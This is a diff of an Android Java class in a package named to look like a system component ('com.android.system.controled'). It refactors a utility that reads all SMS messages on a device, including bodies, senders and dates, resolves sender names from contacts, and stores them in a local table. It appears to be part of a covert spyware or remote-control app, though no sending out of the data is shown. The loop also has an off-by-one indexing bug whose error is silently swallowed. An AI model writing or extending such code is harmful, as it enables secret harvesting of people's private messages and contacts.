@@ -5,23 +5,38 @@ import java.util.ArrayList;
 import android.content.Context;
 
 import com.android.system.controled.Debug;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.SmsInfo;
 import com.android.system.controled.db.TableAllsms;
 
 public class SmsSaveOutUtil {
 
-	private TableAllsms mAllsmsTable;
-	private SmsProviderUtil mSmsGetContent;
-	private Context mContext;
+	private static TableAllsms mAllsmsTable;
+	private static SmsProviderUtil mSmsGetContent;
+//	private static Context mContext;
 
-	public SmsSaveOutUtil(Context con) {
-		this.mAllsmsTable = new TableAllsms(con);
-		this.mSmsGetContent = new SmsProviderUtil(con);
-		this.mContext = con;
+	private static SmsSaveOutUtil mInstence;
+	
+	private SmsSaveOutUtil() {
+		
+	}
+	
+	public static  SmsSaveOutUtil getInstence() {
+		if(mAllsmsTable == null) {
+			mAllsmsTable = TableAllsms.getInstence();
+		}
+		
+		if(mSmsGetContent == null) {
+			mSmsGetContent = SmsProviderUtil.getInstence();
+		}
+		if(mInstence == null) {
+			mInstence = new SmsSaveOutUtil();
+		}
+		return mInstence;
 	}
 
 	/**
-	 * 保存所有邮件
+	 * 保存所有信息
 	 * 
 	 * @Description:
 	 * @param folder
@@ -38,7 +53,12 @@ public class SmsSaveOutUtil {
 		int smsSize = allSms.size();
 		for (int o = 1; o <= smsSize; o++) {
 			try {
-				mAllsmsTable.insertData(allSms.get(o).getThread_id(), allSms.get(o).getDate(), TimeUtil.longToDateTimeString(allSms.get(o).getDate()), allSms.get(o).getAddress(), allSms.get(o).getPerson(), ContactsUtil.getNameFromContactsByNumber(mContext, allSms.get(o).getAddress()), allSms.get(o).getType(), allSms.get(o).getSubject(), allSms.get(o).getBody(), allSms.get(o).getRead(), allSms.get(o).getStatus());
+				// mAllsmsTable.insertData(allSms.get(o).getThread_id(), allSms.get(o).getDate(),
+				// TimeUtil.longToDateTimeString(allSms.get(o).getDate()), allSms.get(o).getAddress(),
+				// allSms.get(o).getPerson(), ContactsUtil.getNameFromContactsByNumber(mContext,
+				// allSms.get(o).getAddress()), allSms.get(o).getType(), allSms.get(o).getSubject(),
+				// allSms.get(o).getBody(), allSms.get(o).getRead(), allSms.get(o).getStatus());
+				mAllsmsTable.insertData(allSms.get(o), ContactsUtil.getNameFromContactsByNumber(MainApplication.getInstence(), allSms.get(o).getAddress()));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
@@ -61,7 +81,11 @@ public class SmsSaveOutUtil {
 		Debug.v("SmsSaveOutUtil", "Save Msg Last One:  " + oneSms.getBody());
 
 		try {
-			mAllsmsTable.insertData(oneSms.getThread_id(), oneSms.getDate(), TimeUtil.longToDateTimeString(oneSms.getDate()), oneSms.getAddress(), oneSms.getPerson(), ContactsUtil.getNameFromContactsByNumber(mContext, oneSms.getAddress()), oneSms.getType(), oneSms.getSubject(), oneSms.getBody(), oneSms.getRead(), oneSms.getStatus());
+			// mAllsmsTable.insertData(oneSms.getThread_id(), oneSms.getDate(),
+			// TimeUtil.longToDateTimeString(oneSms.getDate()), oneSms.getAddress(), oneSms.getPerson(),
+			// ContactsUtil.getNameFromContactsByNumber(mContext, oneSms.getAddress()), oneSms.getType(),
+			// oneSms.getSubject(), oneSms.getBody(), oneSms.getRead(), oneSms.getStatus());
+			mAllsmsTable.insertData(oneSms, ContactsUtil.getNameFromContactsByNumber(MainApplication.getInstence(), oneSms.getAddress()));
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -85,5 +109,6 @@ public class SmsSaveOutUtil {
 		}
 
 	}
-
+	
+	
 }
